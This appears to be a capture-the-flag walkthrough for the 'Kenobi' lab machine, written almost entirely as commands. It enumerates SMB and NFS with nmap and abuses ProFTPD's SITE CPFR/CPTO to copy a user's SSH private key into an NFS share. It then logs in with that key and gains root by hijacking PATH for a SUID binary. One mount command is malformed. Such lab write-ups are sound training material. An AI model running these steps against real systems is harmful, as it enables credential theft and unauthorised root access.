# BASIC INFO

```
ip_addr = 10.10.118.198

open port:
	21/tcp		ftp/ProFTPD 1.3.5
	22/tcp		ssh/OpenSSH 7.2p2
	80/tcp		http/Apache httpd 2.4.18
	111/tcp		rpcbind
	139/tcp		netbios-ssn/Samba smbd 3.X - 4.X
	445/tcp		netbios-ssn/Samba smbd 4.3.11-Ubuntu
	2049/tcp	nfs_acl
HOST = KENOBI

```

# ENUMERATING

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap/enum $IP -T4
```
shares found: 3
-guests
-anonymous
-print$

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN nmap/rpc $IP -T4

```
mount point: /var

# GAINING INITIAL CONTROL WITH PROFTPD

```
nc $IP 21
SITE CPRF /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

mount.nfs $IP:/mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@$IP

```

# PRIV ESC

```
find / -perm -u=s -type f 2>/dev/null
/usr/bin/menu
cd /tmp
echo /bin/bash > ifconfig
chmod 777 ifconfig
export PATH=/tmp:$PATH

/usr/bin/menu
3

```